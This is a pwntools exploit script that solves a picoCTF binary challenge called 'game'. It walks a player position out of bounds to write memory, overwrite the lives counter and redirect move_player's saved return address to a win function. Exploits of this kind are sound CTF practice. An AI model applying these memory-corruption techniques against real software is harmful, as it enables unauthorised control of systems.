#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./game_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc rhea.picoctf.net 57143"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


def set_pos(_x, _y):
    global x, y
    dx = abs(x - _x)
    dy = abs(y - _y)

    if y > _y:
        io.sendline(b"w" * dy)
    if y < _y:
        io.sendline(b"s" * dy)

    if x > _x:
        io.sendline(b"a" * dx)
    if x < _x:
        io.sendline(b"d" * dx)

    x = _x
    y = _y


def write(c):
    io.sendline(b"l" + c)


def solve():
    io.sendline(b"p")


env = {}
io = start()

x = None
y = None


x = 4
y = 4
# obstacle @ x=0, y=0
set_pos(4, -1)  # avoid obstacle by going to map[-90 + 4]
set_pos(0, -1)
set_pos(-7, -1)

# overwrite lives
set_pos(-7, 0)
write(b"\x7f")
set_pos(-6, 0)
set_pos(-5, 0)
set_pos(-4, 0)
set_pos(-4, -3)
set_pos(1, -3)
set_pos(1, 1)
solve()

# obstacle @ x=1, y=0
x = 4
y = 4
set_pos(0, 4)
set_pos(0, -1)
set_pos(-7, -1)
set_pos(-7, 0)
set_pos(-6, 0)
set_pos(-5, 0)
set_pos(-4, 0)
set_pos(-4, -3)
set_pos(0, -3)
set_pos(0, 1)
solve()

x = 4
y = 4
set_pos(-7, 0)
set_pos(-6, 0)
set_pos(-5, 0)
set_pos(-4, 0)
set_pos(1, 1)
solve()

x = 4
y = 4
set_pos(-7, 0)
set_pos(-6, 0)
set_pos(-5, 0)
set_pos(-4, 0)
set_pos(0, 0)
set_pos(90 - 51, 0)
write(b"\x70")
set_pos(90 - 51, -1)  # overwrite move_player saved eip to return to `main+255`

x = 4
y = 4
set_pos(-7, 0)
set_pos(-6, 0)
set_pos(-5, 0)
set_pos(-4, 0)
set_pos(0, 0)
set_pos(90 - 51 - 16, 0)
write(b"\xfe")
set_pos(90 - 51 - 16, -1)  # make move_player return to `call win`

io.interactive()
